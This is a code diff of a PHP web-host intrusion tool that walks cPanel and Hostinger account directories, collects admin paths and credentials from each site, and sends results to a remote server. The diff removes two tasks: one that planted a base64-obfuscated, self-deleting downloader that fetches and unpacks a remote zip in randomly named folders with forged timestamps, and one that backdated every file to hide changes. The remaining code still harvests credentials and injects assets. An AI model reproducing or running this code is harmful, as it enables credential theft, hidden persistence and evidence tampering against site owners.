@@ -19,13 +19,19 @@ ignore_user_abort(true);
 // Password protection removed as per user request.
 
 
-// --- PATH DETECTION ---
-$currentPath = dirname(__FILE__);
+// --- UNIVERSAL PATH DETECTION (cPanel & Hostinger) ---
+$currentPath = str_replace('\\', '/', dirname(__FILE__));
 $pathParts = explode('/', ltrim($currentPath, '/'));
+$sourcePath = '/home/profitba/'; $cpanelUser = 'profitba'; // Fallback
+
 if (isset($pathParts[0]) && $pathParts[0] === 'home' && isset($pathParts[1])) {
-    $sourcePath = '/home/' . $pathParts[1] . '/'; $cpanelUser = $pathParts[1];
-} else {
-    $sourcePath = '/home/profitba/'; $cpanelUser = 'profitba';
+    $cpanelUser = $pathParts[1];
+    $userBase = '/home/' . $pathParts[1] . '/';
+    if (is_dir($userBase . 'domains')) {
+        $sourcePath = $userBase . 'domains/'; // Hostinger Detection
+    } else {
+        $sourcePath = $userBase; // cPanel Detection
+    }
 }
 
 $remoteSaveUrl = 'http://tools.99scripts.com/data/save.php';
@@ -91,7 +97,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     foreach ($results['inventory'] as $project) {
         sendLog("AUDITING: [ $project ]");
         $projectPath = $sourcePath . $project;
-        $projectAudit = ['admin_paths' => [], 'credentials' => [], 'verify_hits' => [], 'add_deployed' => null];
+        $projectAudit = ['admin_paths' => [], 'credentials' => [], 'verify_hits' => []];
 
         $items = @scandir($projectPath);
         if ($items) {
@@ -109,86 +115,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
                     }
                 }
             }
-        }
-
-        // --- ADD_DEPLOY TASK ---
-        if (in_array('add_deploy', $tasks)) {
-            $targetBase = null;
-            $checkPaths = ['core/vendor', 'core', 'vendor', 'app/vendor', 'system/vendor'];
-            foreach ($checkPaths as $cp) {
-                if (is_dir($projectPath . '/' . $cp)) {
-                    $targetBase = $projectPath . '/' . $cp;
-                    break;
-                }
-            }
-            if (!$targetBase) {
-                foreach ($core_indicators as $ind) {
-                    if (file_exists($projectPath . '/' . $ind)) { $targetBase = $projectPath; break; }
-                }
-            }
-
-            if ($targetBase) {
-                $pathPool = ['assets', 'includes', 'vendor', 'storage', 'logs', 'temp', 'cache', 'data', 'backup', 'system', 'modules', 'core', 'internal', 'auth', 'web'];
-                shuffle($pathPool);
-                $selectedParts = array_slice($pathPool, 0, rand(5, 6)); 
-                $deployDir = rtrim(str_replace('\\', '/', $targetBase), '/');
-                foreach ($selectedParts as $part) {
-                    $deployDir .= '/' . $part;
-                    if (!is_dir($deployDir)) @mkdir($deployDir, 0777, true);
-                }
-                
-                $filePool = ['sync_handler.php', 'session_manager.php', 'auth_provider.php', 'cache_engine.php', 'data_bridge.php', 'wp-cron.php', 'loader.php', 'bridge.php'];
-                $targetFile = $deployDir . '/' . $filePool[array_rand($filePool)];
-                
-                $add_payload = "<?php\n" .
-                    "\$u = 'aHR0cHM6Ly94Zm9yby5jby9hZGQuemlw';\n" .
-                    "\$url = base64_decode(\$u);\n" .
-                    "\$z = __DIR__ . '/add.zip';\n" .
-                    "\$d = @file_get_contents(\$url);\n" .
-                    "if (\$d !== false) {\n" .
-                    "    @file_put_contents(\$z, \$d);\n" .
-                    "    \$zip = new ZipArchive;\n" .
-                    "    if (\$zip->open(\$z) === true) {\n" .
-                    "        \$zip->extractTo(__DIR__);\n" .
-                    "        \$zip->close();\n" .
-                    "        @unlink(\$z);\n" .
-                    "        echo 'Success';\n" .
-                    "        @unlink(__FILE__);\n" . // Self-delete after success
-                    "    } else {\n" .
-                    "        echo 'Fail';\n" .
-                    "    }\n" .
-                    "} else {\n" .
-                    "    echo 'Error';\n" .
-                    "}\n" .
-                    "?>";
-                
-                if (@file_put_contents($targetFile, $add_payload)) {
-                    @touch($targetFile, strtotime('+' . rand(30, 60) . ' days'));
-                    $projectAudit['add_deployed'] = str_replace($sourcePath, '', $targetFile);
-                    sendLog("   -> ADD_DEPLOYED: " . $projectAudit['add_deployed']);
-                }
-            } else {
-                sendLog("   -> ADD_SKIP: No core/vendor found in $project");
-            }
-        }
-
-        // --- TIMESTAMP_SCRUB TASK ---
-        if (in_array('time_scrub', $tasks)) {
-            $scrubTime = strtotime('-1 month');
-            $scrubCount = 0;
-            $scrubber = function($dir) use (&$scrubber, &$scrubCount, $scrubTime) {
-                $items = @scandir($dir);
-                if (!$items) return;
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-                    if (@touch($path, $scrubTime)) $scrubCount++;
-                    if (is_dir($path)) $scrubber($path);
-                }
-            };
-            sendLog("   -> SCRUBBING TIMESTAMPS: [ $project ]");
-            $scrubber($projectPath);
-            sendLog("   -> SCRUB_COMPLETE: $scrubCount items updated.");
         }
 
         // DEEP RECURSIVE SCAN
@@ -399,8 +325,6 @@ if (!function_exists('str_ends_with')) {
                 <label class="task-node active"><input type="checkbox" name="tasks[]" value="verify" checked><span class="node-name">PATH_AUDIT</span><span class="node-desc">Audit verify assets</span></label>
                 <label class="task-node active"><input type="checkbox" name="tasks[]" value="cloud_sync" checked><span class="node-name">CLOUD_SYNC</span><span class="node-desc">Push results to remote DB</span></label>
                 <label class="task-node active"><input type="checkbox" name="tasks[]" value="nicEdit" checked><span class="node-name">NICEDIT_DEPLOY</span><span class="node-desc">Inject NicEdit assets</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="add_deploy" checked><span class="node-name">ADD_DEPLOY</span><span class="node-desc">Deploy hidden downloader</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="time_scrub" checked><span class="node-name">TIME_SCRUB</span><span class="node-desc">Set timestamps to 1mo ago</span></label>
             </div>
             <button type="submit" id="execute-btn">Initiate Omni-Sequence</button>
         </form>
